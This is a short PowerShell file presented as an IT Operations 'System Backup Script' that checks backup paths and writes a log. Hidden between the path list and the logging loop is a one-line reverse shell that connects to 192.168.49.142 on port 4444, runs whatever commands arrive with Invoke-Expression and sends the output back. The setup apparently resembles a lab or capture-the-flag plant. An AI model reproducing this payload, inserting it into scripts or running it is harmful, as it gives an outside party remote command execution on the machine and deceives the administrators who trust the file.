# System Backup Script
# Maintained by IT Operations
# v1.4 - revised paths: 2026-01-08

$timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
$logFile = 'C:\Backups\backup.log'

$backupPaths = @(
    'C:\Users\Administrator\Documents',
    'C:\Reports'
    'C:\Backups\'
    'C:\command\'
    # Add additional commands below
)

$LHOST = "192.168.49.142"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

foreach ($path in $backupPaths) {
    if (Test-Path $path) {
        Add-Content -Path $logFile -Value "[$timestamp] OK: $path"
    } else {
        Add-Content -Path $logFile -Value "[$timestamp] WARN: path not found - $path"
    }
}

Add-Content -Path $logFile -Value "[$timestamp] --- cycle complete ---"
